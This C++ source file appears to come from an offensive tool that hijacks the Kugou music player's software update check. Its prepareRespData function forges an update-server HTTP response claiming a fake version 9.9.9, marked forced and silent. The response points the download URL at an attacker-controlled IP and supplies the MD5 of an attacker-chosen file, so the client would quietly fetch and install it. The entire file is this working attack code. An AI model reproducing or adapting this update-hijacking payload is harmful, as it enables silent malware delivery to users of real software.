


#include "kugou.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;


int Kugou::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;

	int version = 9993;
	string strver = "9.9.9";
	string issilence = "true";

	string szip = HttpUtils::getIPstr(ulIP) + "\\/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=gbk\r\nContent-Length: %u\r\n"
		"Content-Encoding: identity\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"<!--KG_TAG_RES_START-->"
		"{ \"status\":1,\"error\":\"0\",\"data\":{\"isgray\":0,\"version\":%u,\"isforce\":1,\"partner\":\"\",\"alert_mode\":0,"
		"\"content\":\"Version:%s\","
		//"\"content\":\"酷狗音乐正式版\r\n1、圆梦计划，为主播打造原创单曲\r\n2、新豆粉礼物，多人连击爆灯\r\n3、直播歌手身份认证全新升级\r\n4、直播歌手封面秀出代表作\r\n5、音乐圈有推荐理由啦，听歌前看看达人怎么说\r\n6、评论可以发话题，界面更整洁好看\r\n7、发现页，更多精彩榜单\r\n8、新增蝰蛇音效，K歌黑科技\r\n9、更多热门话题，等你参与\r\n10、合唱等体验优化\", "
		
		"\"content\":\"new update\","

		"\"title\":\"\",\"url\":\"http:\\/\\/%s\\/%s\","
		"\"hash\":\"%s\",\"silence\":%s,\"interval\":0},\"errcode\":0 }"
		"<!--KG_TAG_RES_END-->\r\n\r\n";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,version, strver.c_str(),szip.c_str(),
		filename.c_str(), m_szmd5,
		issilence.c_str());

	char lptmp[MAX_RESPONSE_HEADER_SIZE];
	int tmplen = sprintf_s(lptmp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	//m_iRespSize = Public::GBKToUTF8(lptmp,tmplen,m_lpResp, MAX_RESPONSE_HEADER_SIZE);

	memcpy(m_lpResp, lptmp, tmplen);
	m_iRespSize = tmplen;

	return m_iRespSize;
}